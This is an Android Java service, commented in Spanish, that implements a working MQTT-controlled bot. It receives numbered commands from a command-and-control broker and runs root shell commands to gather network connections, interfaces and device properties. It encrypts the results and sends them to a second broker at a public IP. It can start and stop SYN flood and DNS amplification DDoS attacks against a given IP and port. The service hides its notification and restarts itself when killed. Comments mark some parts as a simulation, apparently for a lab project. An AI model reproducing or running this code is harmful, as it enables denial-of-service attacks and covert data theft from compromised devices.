package com.gshp.mqttpersistencev2;

import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.LongDef;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import org.eclipse.paho.android.service.MqttAndroidClient;
import org.eclipse.paho.client.mqttv3.IMqttActionListener;
import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken;
import org.eclipse.paho.client.mqttv3.IMqttToken;
import org.eclipse.paho.client.mqttv3.MqttCallback;
import org.eclipse.paho.client.mqttv3.MqttClient;
import org.eclipse.paho.client.mqttv3.MqttException;
import org.eclipse.paho.client.mqttv3.MqttMessage;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.Thread;

class MyThread implements Runnable { //Hilo implementado para crear inundación Syn/AMP dns, y de esta manera, seguir teniendo comunicación con bot-C&C

    Thread t;
    String IPDestino,puertoDestino;
    MqttAndroidClient clientSyn;
    boolean hiloOcupado = false;
    int DoS = 0;


    MyThread(String IP, String port,int tipoDos,MqttAndroidClient client) throws MqttException //Constructor
    {
        this.IPDestino = IP; //this (acceder a variables de otras clases)
        this.puertoDestino = port;
        this.DoS = tipoDos;
        this.clientSyn = client;
        t = new Thread(this);
        t.start(); // Empieza el hilo



    }

    // execution of thread starts from run() method
    public void run()
    {
        while (!Thread.interrupted()) {


            final String[] str = {""};
            final StringBuffer sb =  new StringBuffer();

            try
            {

                   if(this.DoS == 1){
                       Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/multiSyn " + this.IPDestino + " " + this.puertoDestino});// Syn fl
                       BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                       while((str[0] = inputStream.readLine())!= null){
                           sb.append(str[0]);
                       }
                       String consulta = sb.toString();
                       byte[] bytes = consulta.getBytes();
                       MqttMessage mqttMessage = new MqttMessage(bytes);
                       this.clientSyn.publish("CyC", mqttMessage);
                   }else if (this.DoS == 2){
                       Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "data/local/tmp/ampDns " + this.IPDestino + " " + this.puertoDestino});// Syn fl
                       BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                       while((str[0] = inputStream.readLine())!= null){
                           sb.append(str[0]);
                       }
                       String consulta = sb.toString();
                       byte[] bytes = consulta.getBytes();
                       MqttMessage mqttMessage = new MqttMessage(bytes);
                       this.clientSyn.publish("CyC", mqttMessage);
                   }

            } catch (Exception e) {
                e.printStackTrace();
            }

        }
        //System.out.println("Thread has stopped.");
    }
}


public class MqttConnectionManagerService extends Service {

    private static final String TAG = "MqttConnectionManagerSe";
    private MqttAndroidClient client;
    private MqttAndroidClient client2; //SIMULACIÓN <--------------
    private boolean hiloOcupado = false; //Valiación  de 1 solo DoS a la vez,
    private boolean dosFloodSyn = false, dosAmpDns = false;
    MyThread t1; //Para matar proceso del case 10,13


    @SuppressLint("WrongConstant")
    @Override
    public void onCreate() {
        super.onCreate();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            String NOTIFICATION_CHANNEL_ID = "-";
            String channelName = "-";
            NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
            chan.setLightColor(Color.BLUE);
            chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            assert manager != null;
            manager.createNotificationChannel(chan);

            NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
            Notification notification = notificationBuilder.setOngoing(true)
                    .setContentTitle("-")
                    .setPriority(NotificationManager.IMPORTANCE_MIN)
                    .setCategory(Notification.CATEGORY_SERVICE)
                    .build();

            startForeground(2, notification);
            startForeground(1, notification);
            stopSelf(2);
            stopForeground(true);


        } else {
            //NormalService, no hay necesidad de llamar a alguna función en especial.
        }

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        connect();
        return START_STICKY;
    }

    public void connect() {

        final String clientId = MqttClient.generateClientId();
        final String clientId2 = MqttClient.generateClientId(); //SIMULACIÓN <----------

        client = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://192.168.1.78:1883",
                clientId);
        client2 = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://187.208.237.95:1883",
                clientId2); //SIMULACIÓN <-------------

        final SharedPreferences sharedPreferences = getApplication().getApplicationContext().getSharedPreferences("IoTE", Context.MODE_PRIVATE);
        final String id = sharedPreferences.getString("ID", "-");
        final String key = sharedPreferences.getString("KEY", "-");
        final  int firstTime = sharedPreferences.getInt("FIRST_TIME", 1);


        try {
            IMqttToken token = client.connect();
            IMqttToken token2 = client2.connect();//SIMULACIÓN <-------------

            client.setCallback(new MqttCallback() {
                @Override
                public void connectionLost(Throwable cause) {

                }

                @Override
                public void messageArrived(String topic, MqttMessage message) throws MqttException, IOException {
                    Log.d(TAG, "messageArrived: Topic: " + topic + " Message: " + message);

                    String s = String.valueOf(message);
                    final String[] splited = s.split("\\s+");

                    final StringBuffer sb = new StringBuffer();
                    final String[] str = {""};

                    String id = "73059017-c2c8-43af-9c48-41481c6dec85"; //SIMULACIÓN
                    int firstTime = 0; //SIMULACIÓN

                    switch (Integer.parseInt(splited[0]))
                    {
                        case 1:
                            try {
                                Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "ip link show"});// INTERFACES DE RED.
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String networkInterfaces = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"1\", \"value\": \""+networkInterfaces+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                int[] indexes = blowfish.generateIndexes();
                                String sub_key = key.substring(indexes[0] , indexes[1]);
                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                try {
                                    bytesMqtt.write(mqttPayload.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            break;

                        case 2:
                            try {
                                Process p = Runtime.getRuntime().exec("netstat -at"); //Conexiones TCP
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String tcpConnections = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"2\", \"value\": \""+tcpConnections+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                int[] indexes = blowfish.generateIndexes();
                                String sub_key = key.substring(indexes[0] , indexes[1]);
                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                try {
                                    bytesMqtt.write(mqttPayload.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;
                        case 3:

                            try {
                                Process p = Runtime.getRuntime().exec("netstat -au"); //UDP
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String udpConnections = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"3\", \"value\": \""+udpConnections+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                int[] indexes = blowfish.generateIndexes();
                                String sub_key = key.substring(indexes[0] , indexes[1]);
                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                try {
                                    bytesMqtt.write(mqttPayload.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 4:

                            try {
                                Process p = Runtime.getRuntime().exec("getprop dalvik.vm.isa.arm.variant"); //Nombre Procesador
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String processor = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"4\", \"value\": \""+processor+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                int[] indexes = blowfish.generateIndexes();
                                String sub_key = key.substring(indexes[0] , indexes[1]);
                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                try {
                                    bytesMqtt.write(mqttPayload.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 5:

                            try {
                                Process p = Runtime.getRuntime().exec("getprop ro.product.cpu.abi");//Arquitectura procesador
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String architecturProcessor = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"5\", \"value\": \""+architecturProcessor+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                int[] indexes = blowfish.generateIndexes();
                                String sub_key = key.substring(indexes[0] , indexes[1]);
                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                try {
                                    bytesMqtt.write(mqttPayload.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 6:

                            try {
                                Process p = Runtime.getRuntime().exec("getprop ro.product.model"); //Modelo
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String model = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"6\", \"value\": \""+model+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                int[] indexes = blowfish.generateIndexes();
                                String sub_key = key.substring(indexes[0] , indexes[1]);
                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                try {
                                    bytesMqtt.write(mqttPayload.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 7:

                            try {
                                Process p = Runtime.getRuntime().exec("getprop ro.build.version.sdk"); //version SDK
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String sdk = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"7\", \"value\": \""+sdk+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                int[] indexes = blowfish.generateIndexes();
                                String sub_key = key.substring(indexes[0] , indexes[1]);
                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                try {
                                    bytesMqtt.write(mqttPayload.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 8:

                            try {
                                Process p = Runtime.getRuntime().exec("getprop persist.sys.timezone"); //Zona horaria
                                BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                while((str[0] = inputStream.readLine())!= null){
                                    sb.append(str[0]);
                                }
                                String timeZone = sb.toString();
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"8\", \"value\": \""+timeZone+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                int[] indexes = blowfish.generateIndexes();
                                String sub_key = key.substring(indexes[0] , indexes[1]);
                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                try {
                                    bytesMqtt.write(mqttPayload.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client2.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            break;

                        case 9:
                             /*
                            Se inicializa un hilo para la inundación Syn,
                            de esta manera, se crea un proceso "independente" que no bloquea la comunicación
                            entre C&C-Bot. Nota: Si no se crea el hilo, los camndos 1,2,3..
                            dejan de ser recibidos por el bot, lo cual imposibilita detener
                            la inundación SYN.*/
                             if(hiloOcupado == false && dosFloodSyn == false){

                                 t1 = new MyThread(splited[1],splited[2],1,client);

                                 String floodSyn = "Iniciada";
                                 String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";

                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                 int[] indexes = blowfish.generateIndexes();
                                 String sub_key = key.substring(indexes[0] , indexes[1]);
                                 String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                 try {
                                     bytesMqtt.write(mqttPayload.getBytes());
                                     bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }

                                 MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                 try {
                                     client.publish("CyC",mqttMessage);
                                 } catch (MqttException e) {
                                     e.printStackTrace();
                                 }
                                 //Cambio de estado de las banderas
                                 hiloOcupado = true;
                                 dosFloodSyn = true;

                             }else if (hiloOcupado == true){

                                 String floodSyn = "Error (1) Solo un DDoS a la vez";
                                 String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";

                                 //Cifrando
                                 Blowfish blowfish = new Blowfish();
                                 ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                 int[] indexes = blowfish.generateIndexes();
                                 String sub_key = key.substring(indexes[0] , indexes[1]);
                                 String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                 try {
                                     bytesMqtt.write(mqttPayload.getBytes());
                                     bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                 } catch (Exception e) {
                                     e.printStackTrace();
                                 }

                                 MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                 try {
                                     client.publish("CyC",mqttMessage);
                                 } catch (MqttException e) {
                                     e.printStackTrace();
                                 }

                             }

                            break;

                        case 10:

                            if(hiloOcupado == true && dosFloodSyn == true){

                                hiloOcupado = false;
                                dosFloodSyn = false;
                                t1.t.interrupt(); //para el hilo...

                                try {
                                    Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "killall -9 multiSyn"});// mata el proceso...
                                    BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                    while((str[0] = inputStream.readLine())!= null){
                                        sb.append(str[0]);
                                    }
                                    String floodSyn = "Detenida";
                                    String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";

                                    //Cifrando
                                    Blowfish blowfish = new Blowfish();
                                    ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                    int[] indexes = blowfish.generateIndexes();
                                    String sub_key = key.substring(indexes[0] , indexes[1]);
                                    String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                    try {
                                        bytesMqtt.write(mqttPayload.getBytes());
                                        bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }

                                    MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                    try {
                                        client.publish("CyC",mqttMessage);
                                    } catch (MqttException e) {
                                        e.printStackTrace();
                                    }

                                } catch (Exception e) {
                                    e.printStackTrace();
                                }


                            }else if (dosFloodSyn == false){

                                String floodSyn = "Error (2) No ha sido iniciada";
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                int[] indexes = blowfish.generateIndexes();
                                String sub_key = key.substring(indexes[0] , indexes[1]);
                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                try {
                                    bytesMqtt.write(mqttPayload.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }
                            }

                            break;

                        case 11:

                            if(hiloOcupado == false && dosAmpDns == false){
                                t1 = new MyThread(splited[1],splited[2],2,client);

                                String ampDns = "Iniciada";
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+ampDns+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                int[] indexes = blowfish.generateIndexes();
                                String sub_key = key.substring(indexes[0] , indexes[1]);
                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                try {
                                    bytesMqtt.write(mqttPayload.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }
                                //Cambio de estado de las banderas
                                hiloOcupado = true;
                                dosAmpDns = true;

                            }else if (hiloOcupado == true){

                                String floodSyn = "Error (1) Solo un DDoS a la vez";
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                int[] indexes = blowfish.generateIndexes();
                                String sub_key = key.substring(indexes[0] , indexes[1]);
                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                try {
                                    bytesMqtt.write(mqttPayload.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }

                            }

                            break;

                        case 12:

                            if(hiloOcupado == true && dosAmpDns == true){
                                hiloOcupado = false;
                                dosAmpDns = false;
                                t1.t.interrupt(); //para el hilo...

                                try {
                                    Process p = Runtime.getRuntime().exec(new String[] { "su", "-c", "killall -9 ampDns"});// mata el proceso...
                                    BufferedReader inputStream = new BufferedReader(new InputStreamReader(p.getInputStream()));
                                    while((str[0] = inputStream.readLine())!= null){
                                        sb.append(str[0]);
                                    }
                                    String floodSyn = "Detenida";
                                    String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";

                                    //Cifrando
                                    Blowfish blowfish = new Blowfish();
                                    ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                    int[] indexes = blowfish.generateIndexes();
                                    String sub_key = key.substring(indexes[0] , indexes[1]);
                                    String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                    try {
                                        bytesMqtt.write(mqttPayload.getBytes());
                                        bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }

                                    MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                    try {
                                        client.publish("CyC",mqttMessage);
                                    } catch (MqttException e) {
                                        e.printStackTrace();
                                    }

                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }else if(dosAmpDns == false ){

                                String ampDns = "Error (2) Has not been started";
                                String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+ampDns+"\"}"+firstTime+"&";

                                //Cifrando
                                Blowfish blowfish = new Blowfish();
                                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                                int[] indexes = blowfish.generateIndexes();
                                String sub_key = key.substring(indexes[0] , indexes[1]);
                                String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                                try {
                                    bytesMqtt.write(mqttPayload.getBytes());
                                    bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }

                                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                                try {
                                    client.publish("CyC",mqttMessage);
                                } catch (MqttException e) {
                                    e.printStackTrace();
                                }
                            }

                            break;

                        case 13:

                            /*String consultaFinal = "{'dispositivo':'"+ id +"', 'valor': 'Detenido','campo': 'Tarea Programada/Servicio'}";
                            byte[] bytes = consultaFinal.getBytes();
                            MqttMessage mqttMessage = new MqttMessage(bytes);
                            client.publish("CyC", mqttMessage);*/

                            String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"11\", \"value\": \"Inactivo\"}"+firstTime+"&";

                            //Cifrando
                            Blowfish blowfish = new Blowfish();
                            ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
                            int[] indexes = blowfish.generateIndexes();
                            String sub_key = key.substring(indexes[0] , indexes[1]);
                            String mqttPayload = String.format("%02d", indexes[0]) + String.format("%02d", indexes[1]) + sub_key;

                            try {
                                bytesMqtt.write(mqttPayload.getBytes());
                                bytesMqtt.write(blowfish.encrypt(sub_key,deviceInfo));
                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());

                            try {
                                client.publish("CyC",mqttMessage);
                            } catch (MqttException e) {
                                e.printStackTrace();
                            }


                            MainActivity.getInstance().cancelJob(); //Se teniene la tarea programada
                            stopSelf(1); //Se detiene el servicio persistente.
                            stopSelf(2);
                            stopForeground(true);

                            break;

                        default:

                            Log.d (TAG,"Pura mierda (vida): "+s);
                            break;

                    }

                }

                @Override
                public void deliveryComplete(IMqttDeliveryToken token) {

                }
            });

            token.setActionCallback(new IMqttActionListener() {
                @Override
                public void onSuccess(IMqttToken asyncActionToken) {
                    Log.d(TAG, "onSuccess: Successfully connected to broker!!!");
                    try {
                        client.subscribe("test", 0, null, new IMqttActionListener() {
                            @Override
                            public void onSuccess(IMqttToken asyncActionToken) {
                                Log.d(TAG, "onSuccess:  Successfully subscribed to topic!!!");
                            }

                            @Override
                            public void onFailure(IMqttToken asyncActionToken, Throwable exception) {

                            }
                        });
                    } catch (MqttException e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void onFailure(IMqttToken asyncActionToken, Throwable exception) {
                    Log.d(TAG, "onFailure");
                }
            });

            //=========================================================================== simulación !!!!!!
            token2.setActionCallback(new IMqttActionListener() {
                @Override
                public void onSuccess(IMqttToken asyncActionToken) {
                    Log.d(TAG, "onSuccess: Successfully connected to broker2!!!");
                    try {
                        client.subscribe("test", 0, null, new IMqttActionListener() {
                            @Override
                            public void onSuccess(IMqttToken asyncActionToken) {
                                Log.d(TAG, "onSuccess:  Successfully subscribed to topic2!!!");
                            }

                            @Override
                            public void onFailure(IMqttToken asyncActionToken, Throwable exception) {

                            }
                        });
                    } catch (MqttException e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void onFailure(IMqttToken asyncActionToken, Throwable exception) {
                    Log.d(TAG, "onFailure2");
                }
            });
        } catch (MqttException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {

        try {
            client.unsubscribe("test");
            Log.d(TAG, "onSuccess:  Successfully Unsubscribed to topic!!!");
        } catch (MqttException e) {
            e.printStackTrace();
            Log.d(TAG, "onFail:  Failed to Unsubscribed");
        }


        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartService");
        broadcastIntent.setClass(this, MqttServiceStartReceiver.class);
        this.sendBroadcast(broadcastIntent);
        super.onDestroy();

    }
}
